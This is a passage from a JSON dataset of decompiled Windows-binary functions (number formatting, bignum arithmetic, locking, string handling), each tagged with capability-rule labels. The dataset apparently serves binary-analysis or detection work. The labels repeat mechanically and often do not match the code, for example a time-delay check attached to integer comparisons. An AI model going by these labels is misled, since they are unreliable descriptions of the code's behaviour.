(uStack108 != 1) {\n                do {\n                    uVar14 = uVar14 + 1;\n                    pcVar27 = pcVar28 + 1;\n                    dVar3 = *0x5278c4;\n                    uStack52 = ROUND((dVar2 * dVar3) / dVar4);\n                    *pcVar28 = uStack52 + '0';\n                    dVar2 = dVar2 * dVar3 - uStack52 * dVar4;\n                    auStack32[0] = uVar14;\n                    if (dVar2 == 0.0) goto code_r0x00444728;\n                    pcVar28 = pcVar27;\n                } while (uVar14 != uStack108);\n            }\n            pcVar28 = pcVar12;\n            if (uStack116 == 0) {\n                uVar17 = pcVar27[-1];\n                if ((dVar2 + dVar2 <= dVar4) && ((dVar2 + dVar2 != dVar4 || ((uStack52 & 1) == 0)))) {\n                    uVar14 = 0x10;\n                    pcVar28 = pcVar27;\n                    goto code_r0x00444993;\n                }\n            }\n            else {\n                uVar14 = 0x10;\n                if (uStack116 != 1) goto code_r0x00443fb7;\n                uVar17 = pcVar27[-1];\n            }\n            goto code_r0x0044487e;\n        }\n        if ((uStack108 != 0) || ((dVar2 & 0xffffffff | uVar13 << 0x20) <= dVar4 * *0x5278d0)) {\ncode_r0x004447c6:\n            iStack132 = 0;\n            uVar13 = 0;\n            pcVar27 = pcVar12;\n            goto code_r0x004441f0;\n        }\n        iStack68 = uStack124 + 2;\n        iStack132 = 0;\n        uVar13 = uStack108;\ncode_r0x00443f8d:\n        uVar14 = 0x20;\n        pcVar27 = pcVar12 + 1;\n        *pcVar12 = '1';\n    }\n    fcn.00446000(iStack132);\n    if (uVar13 == 0) goto code_r0x00443fb7;\ncode_r0x00443faf:\n    fcn.00446000(uVar13);\ncode_r0x00443fb7:\n    fcn.00446000(iVar20);\n    *pcVar27 = '\\0';\n    *param_7 = iStack68;\n    if (param_8 != NULL) {\n        *param_8 = pcVar27;\n    }\n    *param_4 = *param_4 | uVar14;\n    return pcVar12;\n}\n",
        "token_count": 8670
    },
    "00445a80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint fcn.00445a80(char **param_1, uint32_t *param_2, uint32_t *param_3)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    int32_t iVar8;\n    uint32_t *puVar9;\n    int32_t iVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    char *pcVar14;\n    uint8_t uStack68;\n    uint8_t uStack64;\n    int32_t iStack60;\n    uint32_t *puStack56;\n    \n    if (*0x56be30 == '\\0') {\n        fcn.00445a10();\n    }\n    uVar3 = *param_2 & 0x1f;\n    pcVar14 = *param_1;\n    puVar6 = param_3 + (*param_2 >> 5) + 1;\n    if (uVar3 == 0) {\n        puVar6 = param_3 + (*param_2 >> 5);\n    }\n    puVar11 = puVar6 + -1;\n    puVar6[-1] = 0;\n    while (pcVar14[1] - 1 < 0x20) {\n        pcVar14 = pcVar14 + 1;\n    }\n    if (((pcVar14[1] == 0x30) && ((pcVar14[2] & 0xdfU) == 0x58)) && (uVar1 = pcVar14[3],  0x20 < uVar1)) {\n        pcVar14 = pcVar14 + 2;\n    }\n    else {\n        uVar1 = pcVar14[1];\n    }\n    iVar8 = 0;\n    iStack60 = 0;\n    iVar10 = 0;\n    puVar12 = puVar11;\n    puStack56 = puVar11;\n    do {\n        uVar5 = uVar1;\n        if (uVar5 == 0) {\n            if (iVar10 == 0) {\n                return 4;\n            }\ncode_r0x00445ca0:\n            if ((puVar12 < puStack56) && (iVar8 < 8)) {\n                cVar2 = '\\b' - iVar8;\n                uStack68 = cVar2 * -4 + 0x20;\n                uVar5 = *puVar12;\n                puVar7 = puVar12;\n                do {\n                    puVar9 = puVar7 + 1;\n                    *puVar7 = uVar5 | puVar7[1] << (uStack68 & 0x1f);\n                    uVar5 = puVar7[1] >> (cVar2 * '\\x04' & 0x1fU);\n                    *puVar9 = uVar5;\n                    puVar7 = puVar9;\n                } while (puVar9 < puStack56);\n            }\n            puVar7 = param_3;\n            if (param_3 < puVar12) {\n                do {\n                    puVar9 = puVar12 + 1;\n                    *puVar7 = *puVar12;\n                    puVar12 = puVar9;\n                    puVar13 = puVar7 + 1;\n                    puVar7 = puVar7 + 1;\n                } while (puVar9 <= puVar11);\n                do {\n                    puVar12 = puVar13 + 1;\n                    *puVar13 = 0;\n                    puVar13 = puVar12;\n                } while (puVar12 <= puVar11);\n                uVar5 = puVar6[-1];\n            }\n            else {\n                uVar5 = puVar6[-1];\n                if (uVar3 != 0) {\n                    uVar5 = uVar5 & 0xffffffffU >> (0x20U - uVar3 & 0x1f);\n                    puVar6[-1] = uVar5;\n                }\n            }\n            while( true ) {\n                if (uVar5 != 0) {\n                    return 5;\n                }\n                if (param_3 == puVar11) break;\n                puVar11 = puVar11 + -1;\n                uVar5 = *puVar11;\n            }\n            *puVar11 = 1;\n            return 5;\n        }\n        pcVar4 = pcVar14 + 1;\n        uVar1 = *(uVar5 + 0x56be00);\n        if (uVar1 == 0) {\n            if (0x20 < uVar5) {\n                if ((uVar5 != 0x29) || (iVar10 == 0)) {\n                    pcVar4 = pcVar14 + 2;\n                    if (uVar5 != 0x29) {\n                        cVar2 = pcVar14[2];\n                        while( true ) {\n                            if (cVar2 == '\\0') {\n                                return 4;\n                            }\n                            pcVar4 = pcVar4 + 1;\n                            if (cVar2 == ')') break;\n                            cVar2 = *pcVar4;\n                        }\n                    }\n                    *param_1 = pcVar4;\n                    return 4;\n                }\n                *param_1 = pcVar14 + 2;\n                goto code_r0x00445ca0;\n            }\n            puVar7 = puVar12;\n            if (iStack60 < iVar10) {\n                if ((puVar12 < puStack56) && (iVar8 < 8)) {\n                    cVar2 = '\\b' - iVar8;\n                    uStack68 = cVar2 * '\\x04';\n                    uStack64 = cVar2 * -4 + 0x20;\n                    uVar5 = *puVar12;\n                    do {\n                        puVar9 = puVar7 + 1;\n                        *puVar7 = uVar5 | puVar7[1] << (uStack64 & 0x1f);\n                        uVar5 = puVar7[1] >> (uStack68 & 0x1f);\n                        *puVar9 = uVar5;\n                        puVar7 = puVar9;\n                    } while (puVar9 < puStack56);\n                }\n                iVar8 = 8;\n                if (puVar12 <= param_3) goto code_r0x00445bad;\n                puVar7 = puVar12 + -1;\n                puVar12[-1] = 0;\n                iVar8 = 0;\n                iStack60 = iVar10;\n                puStack56 = puVar7;\n            }\n            uVar1 = pcVar14[2];\n            while (uVar1 < 0x21) {\n                uVar1 = pcVar4[2];\n                pcVar4 = pcVar4 + 1;\n            }\n            puVar12 = puVar7;\n            if (((uVar1 == 0x30) && ((pcVar4[2] & 0xdfU) == 0x58)) && (0x20 < pcVar4[3])) {\n                pcVar4 = pcVar4 + 2;\n            }\n        }\n        else {\n            iVar8 = iVar8 + 1;\n            iVar10 = iVar10 + 1;\n            if (iVar8 < 9) {\n                uVar5 = *puVar12 << 4;\n            }\n            else {\n                if (puVar12 <= param_3) goto code_r0x00445bad;\n                puVar12[-1] = 0;\n                uVar5 = 0;\n                puVar12 = puVar12 + -1;\n                iVar8 = 1;\n            }\n            *puVar12 = uVar1 & 0xf | uVar5;\n        }\ncode_r0x00445bad:\n        uVar1 = pcVar4[1];\n        pcVar14 = pcVar4;\n    } while( true );\n}\n",
        "token_count": 1757
    },
    "00445e20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00445eae)\n// WARNING: Removing unreachable block (ram,0x00445e9f)\n// WARNING: Removing unreachable block (ram,0x00445ea4)\n// WARNING: Removing unreachable block (ram,0x00445e61)\n\nvoid fcn.00445e20(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t in_EAX;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    pcVar1 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n    if (*0x56bd88 != 2) {\n        if (*0x56bd88 != 0) {\n            if (*0x56bd88 == 1) {\n                do {\n                    (*pcVar2)(1);\n                } while (*0x56bd88 == 1);\n                if (*0x56bd88 == 2) goto code_r0x00445e6b;\n            }\n            return;\n        }\n        *0x56bd88 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x56bda0);\n        (*pcVar1)(0x56bdb8);\n        fcn.004014c0(0x445ef0);\n        *0x56bd88 = 2;\n    }\ncode_r0x00445e6b:\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_EAX * 0x18 + 0x56bda0);\n    return;\n}\n",
        "token_count": 338
    },
    "00445f30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00445f30(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puStack20;\n    \n    fcn.00445e20();\n    iVar2 = *0x56bd88;\n    if (param_1 < 10) {\n        puVar3 = *(param_1 * 4 + 0x56bd60);\n        if (puVar3 != NULL) {\n            *(param_1 * 4 + 0x56bd60) = *puVar3;\n            goto joined_r0x00445fac;\n        }\n        iVar4 = 1 << (param_1 & 0x1f);\n        uVar1 = iVar4 * 4 + 0x1b;\n        if (0x120 < (*0x515a9c + -0x15ad18 >> 3) + (uVar1 >> 3)) goto code_r0x00445f80;\n        puVar3 = *0x515a9c;\n        *0x515a9c = (uVar1 & 0xfffffff8) + *0x515a9c;\n    }\n    else {\ncode_r0x00445f80:\n        iVar4 = 1 << (param_1 & 0x1f);\n        puVar3 = sub.msvcrt.dll_malloc(iVar4 * 4 + 0x1bU & 0xfffffff8);\n        if (puVar3 == NULL) {\n            return;\n        }\n    }\n    iVar2 = *0x56bd88;\n    puVar3[1] = param_1;\n    puVar3[2] = iVar4;\njoined_r0x00445fac:\n    if (iVar2 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x56bda0);\n        puVar3 = puStack20;\n    }\n    puVar3[4] = 0;\n    puVar3[3] = 0;\n    return;\n}\n",
        "token_count": 459
    },
    "00446300": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.00446300(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if (((param_2 & 3) != 0) && (param_1 = fcn.00446070(param_1, *((param_2 & 3) * 4 + 0x5278fc), 0),  param_1 == 0)) {\n        return 0;\n    }\n    param_2 = param_2 >> 2;\n    if (param_2 != 0) {\n        puVar1 = *0x56b440;\n        if (*0x56b440 == NULL) {\n            fcn.00445e20();\n            puVar1 = *0x56b440;\n            if (*0x56b440 == NULL) {\n                puVar1 = fcn.00445f30(1);\n                if (puVar1 == NULL) {\n                    *0x56b440 = NULL;\n                    return 0;\n                }\n                puVar1[5] = 0x271;\n                puVar1[4] = 1;\n                *0x56b440 = puVar1;\n                *puVar1 = 0;\n            }\n            if (*0x56bd88 == 2) {\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x56bdb8);\n            }\n        }\n        iVar2 = param_1;\n        if ((param_2 & 1) != 0) goto code_r0x00446351;\n        while (param_2 = param_2 >> 1,  puVar3 = puVar1,  param_2 != 0) {\n            while( true ) {\n                puVar1 = *puVar3;\n                if (puVar1 == NULL) {\n                    fcn.00445e20();\n                    puVar1 = *puVar3;\n                    if (puVar1 == NULL) {\n                        puVar1 = fcn.00446190(puVar3, puVar3);\n                        *puVar3 = puVar1;\n                        if (puVar1 == NULL) {\n                            return 0;\n                        }\n                        *puVar1 = 0;\n                    }\n                    if (*0x56bd88 == 2) {\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x56bdb8);\n                    }\n                }\n                iVar2 = param_1;\n                if ((param_2 & 1) == 0) break;\ncode_r0x00446351:\n                param_1 = fcn.00446190(iVar2, puVar1);\n                if (param_1 == 0) {\n                    return 0;\n                }\n                fcn.00446000(iVar2);\n                param_2 = param_2 >> 1;\n                puVar3 = puVar1;\n                if (param_2 == 0) {\n                    return param_1;\n                }\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 665
    },
    "004465a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.004465a0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    \n    iVar1 = *(param_2 + 0x10);\n    uVar2 = *(param_1 + 0x10) - iVar1;\n    if (uVar2 == 0) {\n        puVar4 = param_1 + 0x14 + iVar1;\n        puVar3 = param_2 + 0x14 + iVar1 * 4;\n        do {\n            puVar3 = puVar3 + -1;\n            puVar4 = puVar4 + -1;\n            if (*puVar4 != *puVar3) {\n                return -(*puVar4 < *puVar3) | 1;\n            }\n        } while (param_1 + 0x14 < puVar4);\n    }\n    return uVar2;\n}\n",
        "token_count": 226
    },
    "004465f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.004465f0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    bool bVar11;\n    int32_t *piStack60;\n    uint32_t *puStack52;\n    int32_t iStack40;\n    \n    iVar1 = *(param_2 + 0x10);\n    iVar10 = *(param_1 + 0x10) - iVar1;\n    bVar11 = iVar10 < 0;\n    iVar4 = param_1;\n    if (iVar10 == 0) {\n        puVar2 = param_1 + 0x14U + iVar1;\n        puVar5 = param_2 + 0x14 + iVar1 * 4;\n        do {\n            puVar5 = puVar5 + -1;\n            puVar2 = puVar2 + -1;\n            if (*puVar2 != *puVar5) {\n                if (*puVar2 < *puVar5) goto code_r0x0044677b;\n                goto code_r0x00446640;\n            }\n        } while (param_1 + 0x14U < puVar2);\n        iStack40 = fcn.00445f30(0);\n        if (iStack40 != 0) {\n            *(iStack40 + 0x10) = 1;\n            *(iStack40 + 0x14) = 0;\n            return iStack40;\n        }\n    }\n    else {\n        iVar10 = 0;\n        if (bVar11) {\ncode_r0x0044677b:\n            iVar10 = 1;\n            iVar4 = param_2;\n            param_2 = param_1;\n        }\ncode_r0x00446640:\n        iStack40 = fcn.00445f30(*(iVar4 + 4));\n        if (iStack40 != 0) {\n            *(iStack40 + 0xc) = iVar10;\n            iVar1 = *(iVar4 + 0x10);\n            puVar2 = iVar4 + 0x14 + iVar1;\n            iVar10 = *(param_2 + 0x10);\n            uVar9 = 0;\n            puVar7 = param_2 + 0x14;\n            piVar6 = iStack40 + 0x14;\n            puVar5 = iVar4 + 0x14;\n            do {\n                puStack52 = puVar5;\n                piStack60 = piVar6;\n                puVar8 = puVar7 + 1;\n                puVar5 = puStack52 + 1;\n                uVar3 = *puStack52 - *puVar7;\n                iVar4 = uVar3 - uVar9;\n                piVar6 = piStack60 + 1;\n                uVar9 = -(uVar3 < uVar9) - (*puStack52 < *puVar7) & 1;\n                *piStack60 = iVar4;\n                puVar7 = puVar8;\n            } while (puVar8 < param_2 + 0x14 + iVar10);\n            iVar10 = iVar1;\n            if (puVar5 < puVar2) {\n                do {\n                    puVar7 = puVar5 + 1;\n                    iVar4 = *puVar5 - uVar9;\n                    uVar9 = -(*puVar5 < uVar9) & 1;\n                    *piVar6 = iVar4;\n                    puVar5 = puVar7;\n                    piVar6 = piVar6 + 1;\n                } while (puVar7 < puVar2);\n                piVar6 = piStack60 + (puVar2 + (-5 - puStack52) & 0xfffffffcU) + 8;\n            }\n            while (iVar4 == 0) {\n                iVar4 = piVar6[(iVar10 + -2) - iVar1];\n                iVar10 = iVar10 + -1;\n            }\n            *(iStack40 + 0x10) = iVar10;\n        }\n    }\n    return iStack40;\n}\n",
        "token_count": 954
    },
    "00446c50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00446c50(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int8_t iVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    \n    iVar2 = *(param_1 + 0x10);\n    puVar1 = param_1 + 0x14;\n    iVar3 = param_2 >> 5;\n    if (iVar2 < iVar3) {\n        puVar7 = puVar1 + iVar2;\n    }\n    else {\n        puVar7 = puVar1 + iVar3;\n        if (((iVar3 < iVar2) && ((param_2 & 0x1f) != 0)) &&\n           (iVar4 = param_2 & 0x1f,  *puVar7 != (*puVar7 >> iVar4) << iVar4)) {\n            return 1;\n        }\n    }\n    if (puVar7 <= puVar1) {\n        return 0;\n    }\n    puVar6 = puVar7 + -1;\n    if (puVar7[-1] == 0) {\n        uVar5 = puVar6 + (3 - puVar1);\n        do {\n            if ((~uVar5 & 0xfffffffc) + puVar7 == puVar6) {\n                return 0;\n            }\n            puVar6 = puVar6 + -1;\n        } while (*puVar6 == 0);\n    }\n    return 1;\n}\n",
        "token_count": 353
    },
    "004470d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.004470d0(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        return 0;\n    }\n    uVar2 = 0;\n    if (*0x56b3d4 != 0) {\n        puVar1 = sub.msvcrt.dll_calloc(1, 0xc);\n        if (puVar1 != NULL) {\n            *puVar1 = param_1;\n            puVar1[1] = param_2;\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x56b3d8);\n            puVar1[2] = *0x56b3d0;\n            *0x56b3d0 = puVar1;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x56b3d8);\n            return 0;\n        }\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 225
    },
    "00448580": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448580(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    return;\n}\n",
        "token_count": 49
    },
    "0044da00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0044da00(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00451af0();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004c2c70(0x68);\n    puVar4[1] = 0;\n    *puVar4 = 0x52c530;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    puVar4[5] = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    *(puVar4 + 9) = 0;\n    *(puVar4 + 0x19) = 0;\n    fcn.004a7560(arg_8h);\n    fcn.004ad130(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 325
    },
    "0044daf0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0044daf0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00451af0();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004c2c70(0xa8);\n    puVar4[1] = 0;\n    *puVar4 = 0x52c540;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    puVar4[5] = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0;\n    *(puVar4 + 0x29) = 0;\n    fcn.004a7c30(arg_8h);\n    fcn.004ad130(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 324
    },
    "0044dbe0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0044dbe0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00451af0();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004c2c70(0x44);\n    *puVar4 = 0x52c654;\n    puVar4[1] = 0;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    *(puVar4 + 0x12) = 0;\n    puVar4[5] = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0;\n    puVar4[0xc] = 0;\n    puVar4[0xd] = 0;\n    *(puVar4 + 0x43) = 0;\n    fcn.004a9a30(arg_8h);\n    fcn.004ad130(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 386
    },
    "0044dcf0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0044dcf0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00451af0();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004c2c70(0x44);\n    *puVar4 = 0x52c664;\n    puVar4[1] = 0;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    *(puVar4 + 0x12) = 0;\n    puVar4[5] = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0;\n    puVar4[0xc] = 0;\n    puVar4[0xd] = 0;\n    *(puVar4 + 0x43) = 0;\n    fcn.004aa110(arg_8h);\n    fcn.004ad130(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 385
    },
    "0044de00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0044de00(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00451af0();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004c2c70(0x54);\n    puVar4[1] = 0;\n    *puVar4 = 0x52c674;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    *(puVar4 + 0x12) = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0;\n    puVar4[0xc] = 0;\n    puVar4[0xd] = 0;\n    puVar4[0xe] = 0;\n    *(puVar4 + 0x52) = 0;\n    fcn.004aa7f0(arg_8h);\n    fcn.004ad130(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 387
    },
    "0044df10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0044df10(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = fcn.00451af0();\n    piVar1 = *(*arg_8h + 0xc) + iVar3 * 4;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    puVar4 = fcn.004c2c70(0x54);\n    puVar4[1] = 0;\n    *puVar4 = 0x52c684;\n    puVar4[2] = 0;\n    puVar4[3] = 0;\n    *(puVar4 + 4) = 0;\n    *(puVar4 + 0x12) = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0;\n    puVar4[0xc] = 0;\n    puVar4[0xd] = 0;\n    puVar4[0xe] = 0;\n    *(puVar4 + 0x52) = 0;\n    fcn.004ab010(arg_8h);\n    fcn.004ad130(puVar4, iVar3);\n    return *piVar1;\n}\n",
        "token_count": 385
    },
    "0044efe0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl\nfcn.0044efe0(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch, int32_t *arg_20h\n            , uint *arg_24h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    code *unaff_EBX;\n    ulong uVar3;\n    uint32_t in_stack_ffffff54;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint *var_5ch;\n    int32_t var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_34h;\n    int32_t var_30h;\n    code *var_1ch;\n    code *var_bp_ch;\n    \n    var_1ch = NULL;\n    var_50h = 0;\n    var_bp_ch = unaff_EBX;\n    uVar3 = fcn.00491440(in_stack_ffffff54 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h & 0xff\n                         , arg_1ch, &var_50h, 0, &var_34h);\n    if (var_50h == 0) {\n        if (var_1ch == NULL) {\n            uVar2 = fcn.004be210(\"uninitialized __any_string\");\n            if (var_1ch != NULL) {\n                (*var_1ch)(&var_34h);\n            }\n            fcn.0043a8e0(uVar2);\n            if (var_1ch != NULL) {\n                (*var_1ch)(uVar3 >> 0x20);\n            }\n            fcn.0043a8e0(&var_34h);\n            if (var_bp_ch != NULL) {\n                (*var_bp_ch)(uVar2);\n            }\n            fcn.0043a8e0(&var_34h);\n            if (var_bp_ch != NULL) {\n                (*var_bp_ch)(uVar2);\n            }\n            fcn.0043a8e0(&var_34h);\n            if (var_bp_ch != NULL) {\n                (*var_bp_ch)(uVar2);\n            }\n            fcn.0043a8e0(&var_34h);\n            if (var_bp_ch != NULL) {\n                (*var_bp_ch)(uVar2);\n            }\n            fcn.0043a8e0(&var_34h);\n            if (var_1ch != NULL) {\n                (*var_1ch)(uVar2);\n            }\n            fcn.0043a8e0(&var_34h);\n            if (var_1ch != NULL) {\n                (*var_1ch)(uVar2);\n            }\n            fcn.0043a8e0(&var_34h);\n            fcn.004aea60();\n            fcn.004c2c30(&var_34h);\n            fcn.0043a8e0(uVar2);\n            fcn.004aea60();\n            fcn.004c2c30(&var_34h);\n            fcn.0043a8e0(uVar2);\n            fcn.004aea60();\n            do {\n                fcn.004c2c30(&var_34h);\n                fcn.0043a8e0(uVar2);\n                fcn.004c2c30(&var_34h);\n                fcn.0043a8e0(uVar2);\n                fcn.00453450();\n                fcn.004af570();\n            } while( true );\n        }\n        var_4ch = &var_44h;\n        fcn.004b02f0(var_34h, var_30h + var_34h, arg_8h & 0xffffff00);\n        puVar1 = *arg_24h;\n        if (var_4ch == &var_44h) {\n            fcn.004b1de0(&var_4ch);\n        }\n        else if (puVar1 == arg_24h + 2) {\n            *arg_24h = var_4ch;\n            arg_24h[2] = var_44h;\n            arg_24h[1] = var_48h;\n            var_4ch = &var_44h;\n        }\n        else {\n            uVar2 = arg_24h[2];\n            *arg_24h = var_4ch;\n            arg_24h[1] = var_48h;\n            arg_24h[2] = var_44h;\n            var_4ch = &var_44h;\n            if (puVar1 != NULL) {\n                var_4ch = puVar1;\n                var_44h = uVar2;\n            }\n        }\n        var_5ch = &var_44h;\n        var_48h = 0;\n        *var_4ch = 0;\n        if (var_4ch != var_5ch) {\n            fcn.004c2c30(var_4ch);\n        }\n    }\n    else {\n        *arg_20h = var_50h;\n    }\n    if (var_1ch != NULL) {\n        (*var_1ch)(&var_34h);\n    }\n    return uVar3;\n}\n",
        "token_count": 1234
    },
    "0044f170": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
